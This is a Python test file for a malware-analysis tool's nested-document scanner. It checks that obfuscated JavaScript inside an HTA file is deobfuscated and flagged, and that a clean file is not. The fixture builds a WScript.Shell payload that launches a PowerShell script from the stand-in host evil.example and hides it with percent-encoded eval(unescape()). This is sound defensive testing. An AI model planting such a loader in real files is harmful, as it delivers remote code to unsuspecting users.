"""Deobfuscation phase wired into nested children (Priority D)."""

from __future__ import annotations

import glob
from pathlib import Path

from docutracex import nested
from docutracex.storage import CasePaths

PAYLOAD = ("var sh=new ActiveXObject('WScript.Shell');"
           "sh.Run('cmd /c start http://evil.example/s.ps1',0);")


def _obf_js() -> str:
    pct = "".join("%%%02x" % b for b in PAYLOAD.encode())
    return 'eval(unescape("%s"));' % (pct * 30)


def test_obfuscated_script_in_child_is_deobfuscated(tmp_path: Path) -> None:
    cp = CasePaths("c1", cases_dir=tmp_path / "cases")
    (cp.extracted_dir / "nested").mkdir(parents=True, exist_ok=True)
    child = cp.extracted_dir / "nested" / "evil.hta"
    child.write_text("<html><script>%s</script></html>" % _obf_js())

    res = nested.scan_children([{"path": str(child), "filename": "evil.hta"}], cp)
    rules = {f["rule"] for f in res["findings"]}

    # The recovered payload is analysed and attributed to the child.
    assert "js_deobfuscated" in rules
    assert {"js_wscript_shell", "js_lolbin", "js_activex"} & rules
    assert all(f["location"].startswith("nested:") for f in res["findings"] if f["tool"] == "javascript")

    # Node carries a code summary; the deobfuscated URL reaches the IOC sources.
    node = res["tree"][0]
    assert node.get("code", {}).get("javascript", {}).get("deobfuscated") == 1
    assert any("evil.example" in (s.get("text") or "") for s in res["ioc_sources"])

    # The complete source is dumped (original + deobfuscated) under the child dir.
    dumps = [Path(p).name for p in glob.glob(str(cp.extracted_dir / "code" / "js" / "nested" / "*"))]
    assert any(d.endswith(".js") and "deobfuscated" not in d for d in dumps)
    assert any(d.endswith(".deobfuscated.js") for d in dumps)


def test_clean_child_adds_no_code_findings(tmp_path: Path) -> None:
    cp = CasePaths("c2", cases_dir=tmp_path / "cases")
    (cp.extracted_dir / "nested").mkdir(parents=True, exist_ok=True)
    child = cp.extracted_dir / "nested" / "ok.hta"
    child.write_text("<html><script>document.title = 'hello';</script></html>")
    res = nested.scan_children([{"path": str(child), "filename": "ok.hta"}], cp)
    assert not any(f["rule"] == "js_deobfuscated" for f in res["findings"])
